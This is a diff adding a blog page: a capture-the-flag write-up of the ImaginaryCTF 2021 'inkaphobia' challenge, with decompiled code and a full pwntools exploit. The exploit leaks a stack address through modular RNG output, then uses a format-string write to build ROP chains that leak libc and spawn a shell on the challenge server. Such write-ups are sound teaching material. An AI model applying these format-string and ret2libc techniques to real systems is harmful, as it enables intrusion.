@@ -1,0 +1,419 @@
+<!doctype html>
+<html lang="en">
+    <head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta content='text/html; charset=utf-8' http-equiv='content-type' />
+
+
+<meta name="title" content="Ethan's Blog" />
+<meta name="description" content="My personal blog, where I will post things that I find interesting." />
+
+
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Ethan's Blog" />
+<meta property="og:description" content="My personal blog, where I will post things that I find interesting." />
+
+
+<meta property="twitter:card" content="summary_large_image" />
+<meta property="twitter:title" content="Ethan's Blog" />
+<meta property="twitter:description" content="My personal blog, where I will post things that I find interesting." />
+
+
+<link rel="alternate" type="application/rss+xml" title="RSS Feed for Ethan Ho" href="/index.xml" />
+
+<meta name="generator" content="Hugo 0.92.2" />
+
+<link href="https://fonts.googleapis.com/css?family=Montserrat:400,700|Open+Sans:400,700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Bitter&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+
+<link href="https://eth007.me/blog/css/styles.css" rel="stylesheet">
+
+<title>Ethan Ho</title>
+
+
+
+<meta name="description" content="Seems that random.org limits how much entropy you can use per day. So why not reuse entropy?
+https://imaginaryctf.org/r/505D-inkaphobia https://imaginaryctf.org/r/D39E-libc.so.6 nc chal.imaginaryctf.org 42008
+ tl; dr Leak stack using leaks in random number generation, use format string to write to the return address and ret2libc.
+solving Well, we got a binary, a libc, and a netcat connection. Upon running the binary, we see that it lets us &ldquo;generate&rdquo; 6 random numbers, and then asks for our name.">
+<meta name="author" content="">
+
+
+<meta property="og:type" content="website">
+<meta property="og:title" content="ImaginaryCTF 2021 - inkaphobia" />
+<meta property="og:description" content="Seems that random.org limits how much entropy you can use per day. So why not reuse entropy?
+https://imaginaryctf.org/r/505D-inkaphobia https://imaginaryctf.org/r/D39E-libc.so.6 nc chal.imaginaryctf.org 42008
+ tl; dr Leak stack using leaks in random number generation, use format string to write to the return address and ret2libc.
+solving Well, we got a binary, a libc, and a netcat connection. Upon running the binary, we see that it lets us &ldquo;generate&rdquo; 6 random numbers, and then asks for our name." />
+<meta property="og:url" content="https://eth007.me/blog/posts/inkaphobia/" />
+<meta property="og:image" content="https://eth007.me/blog/static/open-graph.png">
+<meta property="og:author" content="">
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:domain" content="https://eth007.me/blog/">
+<meta property="twitter:url" content="https://eth007.me/blog/posts/inkaphobia/">
+<meta name="twitter:title" content="ImaginaryCTF 2021 - inkaphobia">
+<meta name="twitter:description" content="Seems that random.org limits how much entropy you can use per day. So why not reuse entropy?
+https://imaginaryctf.org/r/505D-inkaphobia https://imaginaryctf.org/r/D39E-libc.so.6 nc chal.imaginaryctf.org 42008
+ tl; dr Leak stack using leaks in random number generation, use format string to write to the return address and ret2libc.
+solving Well, we got a binary, a libc, and a netcat connection. Upon running the binary, we see that it lets us &ldquo;generate&rdquo; 6 random numbers, and then asks for our name.">
+<meta name="twitter:image" content="https://eth007.me/blog/static/open-graph.png">
+
+<link rel="icon" type="image/x-icon" href="https://eth007.me/blog/img/logo.png">
+
+</head>
+    <body>
+        <div class="content">
+            <nav class="blog-navigation">
+
+  <div class="left">
+    
+      <div class="blog-logo">
+        
+        
+
+        <a href='/blog/' title="Ethan Ho">
+          <img src="https://eth007.me/blog/img/logo.png" alt="Ethan Ho">
+        </a>
+
+      </div>
+    
+      <div class="blog-info">
+          <div class="blog-title">
+            <a href='/blog/' title="Ethan Ho">
+              <h1>Ethan Ho</h1>
+            </a>
+          </div>
+    
+          <div class="blog-description">
+            <a href='/blog/' title="Ethan Ho">
+              <h2></h2>
+            </a>
+          </div>
+      </div>
+
+  </div>
+
+  <div class="right">
+
+    <div class="blog-links">
+
+      <ul class="links">
+
+        
+
+          <li class="item page"><a href='/blog/' title="home">home</a></li><li class="item page"><a href='/blog/cypat' title="projects">projects</a></li><li class="item page"><a href='https://github.com/Eth007' title="github">github</a></li><li class="item page"><a href='https://eth007.me/resume.pdf' title="resume">resume</a></li>
+
+        
+        
+        
+
+      </ul>
+
+    </div>
+
+  </div>
+
+
+</nav>
+            
+
+<div class="single">
+
+    <article>
+
+        <div class="article-meta">
+        
+    <ul class="article-info">
+        <li class="time" style="">
+            <time class="time">13 Sep 2022</time>
+        </li>
+        <li class="reading-time" style="">
+            <span class="material-icons">timer</span>7 min read
+        </li>
+        <li class="words-count" style="">
+            <span class="material-icons">article</span>1306 words
+        </li>
+    </ul>
+
+    <ul class="article-tags" style="">
+
+        
+            
+                <li>
+                    <a href='/blog/tags/pwn'>#pwn</a>
+                </li>
+            
+                <li>
+                    <a href='/blog/tags/ctf'>#ctf</a>
+                </li>
+            
+             
+
+    </ul>
+
+</div>
+                      
+        <div class="article-header">
+            <h1 class="article-title">ImaginaryCTF 2021 - inkaphobia</h1>          
+            <h2 class="article-excerpt">Leaking stack addresses via number theory</h2>  
+        </div>
+
+        <div class="article-content">
+            <blockquote>
+<p>Seems that random.org limits how much entropy you can use per day. So why not reuse entropy?</p>
+<p><a href="https://imaginaryctf.org/r/505D-inkaphobia">https://imaginaryctf.org/r/505D-inkaphobia</a>
+<a href="https://imaginaryctf.org/r/D39E-libc.so.6">https://imaginaryctf.org/r/D39E-libc.so.6</a>
+<code>nc chal.imaginaryctf.org 42008</code></p>
+</blockquote>
+<h2 id="tl-dr">tl; dr</h2>
+<p>Leak stack using leaks in random number generation, use format string to write to the return address and ret2libc.</p>
+<h2 id="solving">solving</h2>
+<p>Well, we got a binary, a libc, and a netcat connection. Upon running the binary, we see that it lets us &ldquo;generate&rdquo; 6 random numbers, and then asks for our name.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ checksec ./inkaphobia
+[*] &#39;/mnt/c/users/ethan/downloads/ImaginaryCTF-2021-Challenges/Pwn/inkaphobia/inkaphobia&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+$ ./inkaphobia
+Welcome to my RNG service!
+Enter max value: 10
+Random number: 8
+Enter max value: 13
+Random number: 2
+Enter max value: 15
+Random number: 3
+Enter max value: 19
+Random number: 8
+Enter max value: 13
+Random number: 2
+Enter max value: 14
+Random number: 4
+Thanks for visiting our RNG! What&#39;s your name?
+ethan
+Thanks for coming, ethan
+</code></pre></div><p>Let&rsquo;s decompile to see what&rsquo;s going on behind the scenes. We fire up Ghidra:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">undefined8 <span style="color:#57c7ff">main</span>(<span style="color:#9aedfe">void</span>)
+{
+  time_t tVar1;
+  <span style="color:#9aedfe">long</span> in_FS_OFFSET;
+  <span style="color:#9aedfe">int</span> local_21c;
+  <span style="color:#9aedfe">char</span> local_218 [<span style="color:#ff9f43">520</span>];
+  <span style="color:#9aedfe">long</span> local_10;
+  
+  local_10 <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">*</span>(<span style="color:#9aedfe">long</span> <span style="color:#ff6ac1">*</span>)(in_FS_OFFSET <span style="color:#ff6ac1">+</span> <span style="color:#ff9f43">0x28</span>);
+  setvbuf(stdout,(<span style="color:#9aedfe">char</span> <span style="color:#ff6ac1">*</span>)<span style="color:#ff9f43">0x0</span>,<span style="color:#ff9f43">2</span>,<span style="color:#ff9f43">0</span>); 
+  setvbuf(stdin,(<span style="color:#9aedfe">char</span> <span style="color:#ff6ac1">*</span>)<span style="color:#ff9f43">0x0</span>,<span style="color:#ff9f43">2</span>,<span style="color:#ff9f43">0</span>);
+  mprotect(abort,<span style="color:#ff9f43">0x2500000</span>,<span style="color:#ff9f43">5</span>);
+  puts(<span style="color:#5af78e">&#34;Welcome to my RNG service!&#34;</span>);
+  tVar1 <span style="color:#ff6ac1">=</span> time((time_t <span style="color:#ff6ac1">*</span>)<span style="color:#ff9f43">0x0</span>);
+  srand((uint)tVar1);
+  local_21c <span style="color:#ff6ac1">=</span> rand();
+  dorng(<span style="color:#ff6ac1">&amp;</span>local_21c);
+  puts(<span style="color:#5af78e">&#34;Thanks for visiting our RNG! What</span><span style="color:#5af78e">\&#39;</span><span style="color:#5af78e">s your name?&#34;</span>);
+  fgets(local_218,<span style="color:#ff9f43">0x200</span>,stdin);
+  printf(<span style="color:#5af78e">&#34;Thanks for coming, &#34;</span>);
+  printf(local_218);
+  <span style="color:#ff6ac1">if</span> (local_10 <span style="color:#ff6ac1">!=</span> <span style="color:#ff6ac1">*</span>(<span style="color:#9aedfe">long</span> <span style="color:#ff6ac1">*</span>)(in_FS_OFFSET <span style="color:#ff6ac1">+</span> <span style="color:#ff9f43">0x28</span>)) {
+                    <span style="color:#78787e">/* WARNING: Subroutine does not return */</span>
+    __stack_chk_fail();
+  }
+  <span style="color:#ff6ac1">return</span> <span style="color:#ff9f43">0</span>;
+}
+</code></pre></div><p>First of all, we see the <code>setvbuf</code> calls. These are mostly irrelevant as they just help output to work when running on the server.</p>
+<p>We also see <code>mprotect(abort,0x2500000,5);</code>. This was actually a failed attempt at making <code>__malloc_hook</code> unwritable, but I left it in to scare people although it doesn&rsquo;t really do much. (libc is already read/execute only)</p>
+<p>Next, we have this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">tVar1 <span style="color:#ff6ac1">=</span> time((time_t <span style="color:#ff6ac1">*</span>)<span style="color:#ff9f43">0x0</span>);
+srand((uint)tVar1);
+local_21c <span style="color:#ff6ac1">=</span> rand();
+dorng(<span style="color:#ff6ac1">&amp;</span>local_21c);
+</code></pre></div><p>Well, seems like it&rsquo;s generating a random number, seeded by the time, and storing it in <code>local_21c</code>. Then, it calls <code>dorng()</code> on <strong>the address of</strong> <code>local_21c</code>. (although it might seem at first glance to be passing the random value in). Let&rsquo;s see what <code>dorng()</code> is doing.</p>
+<p>Sidenote: The RNG uses the address of a variable as the random number, essentially reusing the randomness from ASLR. This is why the description hinted at reusing entropy.</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#9aedfe">void</span> <span style="color:#57c7ff">dorng</span>(<span style="color:#9aedfe">long</span> param_1)
+{
+  <span style="color:#9aedfe">long</span> lVar1;
+  <span style="color:#9aedfe">long</span> in_FS_OFFSET;
+  <span style="color:#9aedfe">int</span> local_224;
+  <span style="color:#9aedfe">char</span> local_218 [<span style="color:#ff9f43">520</span>];
+  <span style="color:#9aedfe">long</span> local_10;
+  
+  local_10 <span style="color:#ff6ac1">=</span> <span style="color:#ff6ac1">*</span>(<span style="color:#9aedfe">long</span> <span style="color:#ff6ac1">*</span>)(in_FS_OFFSET <span style="color:#ff6ac1">+</span> <span style="color:#ff9f43">0x28</span>);
+  local_224 <span style="color:#ff6ac1">=</span> <span style="color:#ff9f43">0</span>;
+  <span style="color:#ff6ac1">while</span>( <span style="color:#ff5c57">true</span> ) {
+    <span style="color:#ff6ac1">if</span> (<span style="color:#ff9f43">5</span> <span style="color:#ff6ac1">&lt;</span> local_224) {
+      <span style="color:#ff6ac1">if</span> (local_10 <span style="color:#ff6ac1">!=</span> <span style="color:#ff6ac1">*</span>(<span style="color:#9aedfe">long</span> <span style="color:#ff6ac1">*</span>)(in_FS_OFFSET <span style="color:#ff6ac1">+</span> <span style="color:#ff9f43">0x28</span>)) {
+                    <span style="color:#78787e">/* WARNING: Subroutine does not return */</span>
+        __stack_chk_fail();
+      }
+      <span style="color:#ff6ac1">return</span>;
+    }
+    printf(<span style="color:#5af78e">&#34;Enter max value: &#34;</span>);
+    fgets(local_218,<span style="color:#ff9f43">0x10</span>,stdin);
+    lVar1 <span style="color:#ff6ac1">=</span> atol(local_218);
+    <span style="color:#ff6ac1">if</span> ((<span style="color:#ff9f43">0x7f</span> <span style="color:#ff6ac1">&lt;</span> lVar1) <span style="color:#ff6ac1">||</span> (lVar1 <span style="color:#ff6ac1">&lt;</span> <span style="color:#ff9f43">1</span>)) <span style="color:#ff6ac1">break</span>;
+    printf(<span style="color:#5af78e">&#34;Random number: %ld</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>,param_1 <span style="color:#ff6ac1">%</span> lVar1,param_1 <span style="color:#ff6ac1">%</span> lVar1);
+    local_224 <span style="color:#ff6ac1">=</span> local_224 <span style="color:#ff6ac1">+</span> <span style="color:#ff9f43">1</span>;
+  }
+  puts(<span style="color:#5af78e">&#34;Go away.&#34;</span>);
+                    <span style="color:#78787e">/* WARNING: Subroutine does not return */</span>
+  exit(<span style="color:#ff9f43">0</span>);
+}
+</code></pre></div><p>OK, it seems that the function is letting you to view the parameter passed to it mod an user-controlled number, with certain restrictions. First, the number can only be viewed under a mod a total of 6 times. Secondly, the number can only be viewed mod a number between 1 and 128.</p>
+<p>So&hellip; seems that we can use this functionality to leak a stack address, namely, the address that was passed to <code>dorng</code>. If we take the address mod 6 numbers, we can use CRT to solve for the address mod the greatest common denominator of the numbers.</p>
+<p>Since we want to maximize the modulo of our final result, we would like this GCD to be  as big as possible. One way to do this (although I&rsquo;m not sure if this is the most optimal way) is to just take the number mod the 6 largest primes less than 128. We write some code to do this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff6ac1">from</span> pwn <span style="color:#ff6ac1">import</span> <span style="color:#ff6ac1">*</span>
+<span style="color:#ff6ac1">from</span> sympy.ntheory.modular <span style="color:#ff6ac1">import</span> crt
+
+context<span style="color:#ff6ac1">.</span>arch <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;amd64&#34;</span>
+elf <span style="color:#ff6ac1">=</span> ELF(<span style="color:#5af78e">&#34;./inkaphobia&#34;</span>)
+libc <span style="color:#ff6ac1">=</span> ELF(<span style="color:#5af78e">&#34;./libc.so.6&#34;</span>)
+rop <span style="color:#ff6ac1">=</span> ROP(elf)
+conn <span style="color:#ff6ac1">=</span> elf<span style="color:#ff6ac1">.</span>process()
+
+primes <span style="color:#ff6ac1">=</span> [<span style="color:#ff9f43">101</span>, <span style="color:#ff9f43">103</span>, <span style="color:#ff9f43">107</span>, <span style="color:#ff9f43">109</span>, <span style="color:#ff9f43">113</span>, <span style="color:#ff9f43">127</span>]
+
+<span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">get_remainder</span>(num):
+  conn<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">&#34;:&#34;</span>)
+  conn<span style="color:#ff6ac1">.</span>sendline(<span style="color:#ff5c57">str</span>(num))
+  conn<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">&#34;:&#34;</span>)
+  rem <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">int</span>(conn<span style="color:#ff6ac1">.</span>recvline()<span style="color:#ff6ac1">.</span>strip())
+  log<span style="color:#ff6ac1">.</span>info(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;addr ≡ </span><span style="color:#5af78e">{</span>rem<span style="color:#5af78e">}</span><span style="color:#5af78e"> (mod </span><span style="color:#5af78e">{</span>num<span style="color:#5af78e">}</span><span style="color:#5af78e">)&#34;</span>)
+  <span style="color:#ff6ac1">return</span> rem
+
+conn<span style="color:#ff6ac1">.</span>recvline()
+remainders <span style="color:#ff6ac1">=</span> []
+<span style="color:#ff6ac1">for</span> prime <span style="color:#ff6ac1">in</span> primes:
+  remainders<span style="color:#ff6ac1">.</span>append(get_remainder(prime))
+
+res <span style="color:#ff6ac1">=</span> crt(primes, remainders)
+</code></pre></div><p>However, this does not give us quite enough information to deduce the address, as the modulo is smaller than <code>0xffffffffffffffff</code>. However, we know that stack addresses on a 64-bit system will be around <code>0x7ffff0000000</code>, so if we add our modulo repeatedly to our result from CRT until we get a value in this range, we can have a leak of the stack address that works most of the time.</p>
+<p>So, we add this snippet of code to deduce a likely candidate for the stack address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf_addr <span style="color:#ff6ac1">=</span> [res[<span style="color:#ff9f43">0</span>]<span style="color:#ff6ac1">+</span>res[<span style="color:#ff9f43">1</span>]<span style="color:#ff6ac1">*</span>n <span style="color:#ff6ac1">for</span> n <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(<span style="color:#ff9f43">1</span>, <span style="color:#ff9f43">1000</span>) <span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">hex</span>(res[<span style="color:#ff9f43">0</span>]<span style="color:#ff6ac1">+</span>res[<span style="color:#ff9f43">1</span>]<span style="color:#ff6ac1">*</span>n)[<span style="color:#ff9f43">0</span>:<span style="color:#ff9f43">4</span>]<span style="color:#ff6ac1">==</span><span style="color:#5af78e">&#34;0x7f&#34;</span> <span style="color:#ff6ac1">and</span> <span style="color:#ff5c57">len</span>(<span style="color:#ff5c57">hex</span>(res[<span style="color:#ff9f43">0</span>]<span style="color:#ff6ac1">+</span>res[<span style="color:#ff9f43">1</span>]<span style="color:#ff6ac1">*</span>n))<span style="color:#ff6ac1">==</span><span style="color:#ff9f43">14</span>][<span style="color:#ff9f43">0</span>]
+</code></pre></div><p>Well, now we&rsquo;re out of the <code>dorng()</code> function with a stack leak. Now what?</p>
+<p>Back to the <code>main()</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">puts(<span style="color:#5af78e">&#34;Thanks for visiting our RNG! What</span><span style="color:#5af78e">\&#39;</span><span style="color:#5af78e">s your name?&#34;</span>);  
+fgets(local_218,<span style="color:#ff9f43">0x200</span>,stdin);
+printf(<span style="color:#5af78e">&#34;Thanks for coming, &#34;</span>);
+printf(local_218);
+</code></pre></div><p>We have a trivial format string vulnerability here. This gives us arbitrary read/write. However, since full RELRO is enabled and we don&rsquo;t have a libc leak, where can we target?</p>
+<p>Well, we have a stack leak. So, we use GDB to find the offset from the leaked address to the return address, which in this case is 540. We can now use our format string to write to the return address (I used pwntools' <code>fmtstr_payload</code> function for the first time, it&rsquo;s really nice), essentially writing a ropchain to the stack. Since we can now ROP, we can return to libc.</p>
+<p>We can first use either ROP or our format string to leak libc, then return back to <code>main()</code> for a second pass. I used ROP to call <code>printf(printf_got)</code>, but there were other ways to do this.</p>
+<p>When we return to <code>main()</code> we now have a libc leak and we can leak a stack address and create a second ropchain that will call <code>system(&quot;/bin/sh&quot;)</code>. Alternatively, overwriting the return address or <code>__malloc_hook</code> with a <code>one_gadget</code> was likely possible, but may have required some more thought on how to set up the registers correctly.</p>
+<p>The result is a shell, and it works around half the time! (Sometimes the leaks don&rsquo;t work out because the address is off by a multiple of our modulo)</p>
+<p>My solve script is below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff6ac1">from</span> pwn <span style="color:#ff6ac1">import</span> <span style="color:#ff6ac1">*</span>
+<span style="color:#ff6ac1">from</span> sympy.ntheory.modular <span style="color:#ff6ac1">import</span> crt
+
+context<span style="color:#ff6ac1">.</span>arch <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;amd64&#34;</span>
+
+elf <span style="color:#ff6ac1">=</span> ELF(<span style="color:#5af78e">&#34;./inkaphobia&#34;</span>)
+libc <span style="color:#ff6ac1">=</span> ELF(<span style="color:#5af78e">&#34;./libc.so.6&#34;</span>)
+rop <span style="color:#ff6ac1">=</span> ROP(elf)
+
+<span style="color:#78787e">#conn = elf.process()</span>
+conn <span style="color:#ff6ac1">=</span> remote(<span style="color:#5af78e">&#34;143.244.152.111&#34;</span>, <span style="color:#ff9f43">42008</span>)
+
+primes <span style="color:#ff6ac1">=</span> [<span style="color:#ff9f43">101</span>, <span style="color:#ff9f43">103</span>, <span style="color:#ff9f43">107</span>, <span style="color:#ff9f43">109</span>, <span style="color:#ff9f43">113</span>, <span style="color:#ff9f43">127</span>]
+
+<span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">get_remainder</span>(num):
+  conn<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">&#34;:&#34;</span>)
+  conn<span style="color:#ff6ac1">.</span>sendline(<span style="color:#ff5c57">str</span>(num))
+  conn<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">&#34;:&#34;</span>)
+  rem <span style="color:#ff6ac1">=</span> <span style="color:#ff5c57">int</span>(conn<span style="color:#ff6ac1">.</span>recvline()<span style="color:#ff6ac1">.</span>strip())
+  log<span style="color:#ff6ac1">.</span>info(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;addr ≡ </span><span style="color:#5af78e">{</span>rem<span style="color:#5af78e">}</span><span style="color:#5af78e"> (mod </span><span style="color:#5af78e">{</span>num<span style="color:#5af78e">}</span><span style="color:#5af78e">)&#34;</span>)
+  <span style="color:#ff6ac1">return</span> rem
+
+conn<span style="color:#ff6ac1">.</span>recvline()
+remainders <span style="color:#ff6ac1">=</span> []
+<span style="color:#ff6ac1">for</span> prime <span style="color:#ff6ac1">in</span> primes: <span style="color:#78787e"># get stack address mod primes</span>
+  remainders<span style="color:#ff6ac1">.</span>append(get_remainder(prime))
+
+<span style="color:#78787e"># solve for the address mod 101*103*107*109*113*127</span>
+res <span style="color:#ff6ac1">=</span> crt(primes, remainders) 
+
+<span style="color:#78787e"># find likely stack address</span>
+buf_addr <span style="color:#ff6ac1">=</span> [res[<span style="color:#ff9f43">0</span>]<span style="color:#ff6ac1">+</span>res[<span style="color:#ff9f43">1</span>]<span style="color:#ff6ac1">*</span>n <span style="color:#ff6ac1">for</span> n <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(<span style="color:#ff9f43">1</span>, <span style="color:#ff9f43">1000</span>) <span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">hex</span>(res[<span style="color:#ff9f43">0</span>]<span style="color:#ff6ac1">+</span>res[<span style="color:#ff9f43">1</span>]<span style="color:#ff6ac1">*</span>n)[<span style="color:#ff9f43">0</span>:<span style="color:#ff9f43">4</span>]<span style="color:#ff6ac1">==</span><span style="color:#5af78e">&#34;0x7f&#34;</span> <span style="color:#ff6ac1">and</span> <span style="color:#ff5c57">len</span>(<span style="color:#ff5c57">hex</span>(res[<span style="color:#ff9f43">0</span>]<span style="color:#ff6ac1">+</span>res[<span style="color:#ff9f43">1</span>]<span style="color:#ff6ac1">*</span>n))<span style="color:#ff6ac1">==</span><span style="color:#ff9f43">14</span>][<span style="color:#ff9f43">0</span>]
+
+log<span style="color:#ff6ac1">.</span>info(<span style="color:#5af78e">&#34;Stack leak: &#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#ff5c57">hex</span>(buf_addr))
+conn<span style="color:#ff6ac1">.</span>recvline()
+
+<span style="color:#78787e"># assemble our first ropchain</span>
+writes_l <span style="color:#ff6ac1">=</span> [
+  rop<span style="color:#ff6ac1">.</span>find_gadget([<span style="color:#5af78e">&#34;ret&#34;</span>])[<span style="color:#ff9f43">0</span>], <span style="color:#78787e"># stack alignment</span>
+  rop<span style="color:#ff6ac1">.</span>find_gadget([<span style="color:#5af78e">&#34;pop rdi&#34;</span>, <span style="color:#5af78e">&#34;ret&#34;</span>])[<span style="color:#ff9f43">0</span>],
+  elf<span style="color:#ff6ac1">.</span>got[<span style="color:#5af78e">&#34;printf&#34;</span>],
+  elf<span style="color:#ff6ac1">.</span>symbols[<span style="color:#5af78e">&#34;printf&#34;</span>],
+  rop<span style="color:#ff6ac1">.</span>find_gadget([<span style="color:#5af78e">&#34;ret&#34;</span>])[<span style="color:#ff9f43">0</span>], <span style="color:#78787e"># stack alignment</span>
+  elf<span style="color:#ff6ac1">.</span>symbols[<span style="color:#5af78e">&#34;main&#34;</span>],
+]
+
+writes <span style="color:#ff6ac1">=</span> {}
+
+<span style="color:#78787e"># format it in a way that pwntools understands, also get the offsets right</span>
+<span style="color:#ff6ac1">for</span> n, addr <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">enumerate</span>(writes_l):
+  writes[buf_addr<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">540</span><span style="color:#ff6ac1">+</span>n<span style="color:#ff6ac1">*</span><span style="color:#ff9f43">8</span>] <span style="color:#ff6ac1">=</span> addr
+
+payload <span style="color:#ff6ac1">=</span> fmtstr_payload(<span style="color:#ff9f43">8</span>, writes)
+
+<span style="color:#78787e"># send our payload and recieve our leaks</span>
+conn<span style="color:#ff6ac1">.</span>sendline(payload)
+printf <span style="color:#ff6ac1">=</span> u64(conn<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">&#34;Welcome&#34;</span>)[<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">13</span>:<span style="color:#ff6ac1">-</span><span style="color:#ff9f43">7</span>] <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\x00\x00</span><span style="color:#5af78e">&#34;</span>)
+log<span style="color:#ff6ac1">.</span>info(<span style="color:#5af78e">&#34;printf(): &#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#ff5c57">hex</span>(printf))
+libc<span style="color:#ff6ac1">.</span>address <span style="color:#ff6ac1">=</span> printf <span style="color:#ff6ac1">-</span> libc<span style="color:#ff6ac1">.</span>symbols[<span style="color:#5af78e">&#34;printf&#34;</span>]
+log<span style="color:#ff6ac1">.</span>info(<span style="color:#5af78e">&#34;libc base: &#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#ff5c57">hex</span>(libc<span style="color:#ff6ac1">.</span>address))
+
+<span style="color:#78787e"># do it all over again</span>
+remainders <span style="color:#ff6ac1">=</span> []
+<span style="color:#ff6ac1">for</span> prime <span style="color:#ff6ac1">in</span> primes:
+  remainders<span style="color:#ff6ac1">.</span>append(get_remainder(prime))
+
+res <span style="color:#ff6ac1">=</span> crt(primes, remainders)
+
+buf2_addr <span style="color:#ff6ac1">=</span> [res[<span style="color:#ff9f43">0</span>]<span style="color:#ff6ac1">+</span>res[<span style="color:#ff9f43">1</span>]<span style="color:#ff6ac1">*</span>n <span style="color:#ff6ac1">for</span> n <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(<span style="color:#ff9f43">1</span>, <span style="color:#ff9f43">1000</span>) <span style="color:#ff6ac1">if</span> <span style="color:#ff5c57">hex</span>(res[<span style="color:#ff9f43">0</span>]<span style="color:#ff6ac1">+</span>res[<span style="color:#ff9f43">1</span>]<span style="color:#ff6ac1">*</span>n)[<span style="color:#ff9f43">0</span>:<span style="color:#ff9f43">4</span>]<span style="color:#ff6ac1">==</span><span style="color:#5af78e">&#34;0x7f&#34;</span> <span style="color:#ff6ac1">and</span> <span style="color:#ff5c57">len</span>(<span style="color:#ff5c57">hex</span>(res[<span style="color:#ff9f43">0</span>]<span style="color:#ff6ac1">+</span>res[<span style="color:#ff9f43">1</span>]<span style="color:#ff6ac1">*</span>n))<span style="color:#ff6ac1">==</span><span style="color:#ff9f43">14</span>][<span style="color:#ff9f43">0</span>]
+log<span style="color:#ff6ac1">.</span>info(<span style="color:#5af78e">&#34;Second stack leak: &#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#ff5c57">hex</span>(buf2_addr))
+conn<span style="color:#ff6ac1">.</span>recvline()
+
+<span style="color:#78787e"># system(&#34;/bin/sh&#34;)</span>
+writes_l <span style="color:#ff6ac1">=</span> [
+  rop<span style="color:#ff6ac1">.</span>find_gadget([<span style="color:#5af78e">&#34;ret&#34;</span>])[<span style="color:#ff9f43">0</span>], <span style="color:#78787e"># stack alignment</span>
+  rop<span style="color:#ff6ac1">.</span>find_gadget([<span style="color:#5af78e">&#34;pop rdi&#34;</span>, <span style="color:#5af78e">&#34;ret&#34;</span>])[<span style="color:#ff9f43">0</span>],
+  <span style="color:#ff5c57">next</span>(libc<span style="color:#ff6ac1">.</span>search(<span style="color:#5af78e">b</span><span style="color:#5af78e">&#34;/bin/sh&#34;</span>)),
+  libc<span style="color:#ff6ac1">.</span>symbols[<span style="color:#5af78e">&#34;system&#34;</span>]
+]
+
+writes <span style="color:#ff6ac1">=</span> {}
+
+<span style="color:#ff6ac1">for</span> n, addr <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">enumerate</span>(writes_l):
+  writes[buf2_addr<span style="color:#ff6ac1">+</span><span style="color:#ff9f43">540</span><span style="color:#ff6ac1">+</span>n<span style="color:#ff6ac1">*</span><span style="color:#ff9f43">8</span>] <span style="color:#ff6ac1">=</span> addr
+
+<span style="color:#ff5c57">print</span>(<span style="color:#ff5c57">len</span>(payload))
+payload <span style="color:#ff6ac1">=</span> fmtstr_payload(<span style="color:#ff9f43">8</span>, writes)
+conn<span style="color:#ff6ac1">.</span>sendline(payload)
+
+<span style="color:#78787e"># clean up output</span>
+conn<span style="color:#ff6ac1">.</span>sendline(<span style="color:#5af78e">&#34;echo end&#34;</span>)
+conn<span style="color:#ff6ac1">.</span>recvuntil(<span style="color:#5af78e">&#34;end</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>)
+
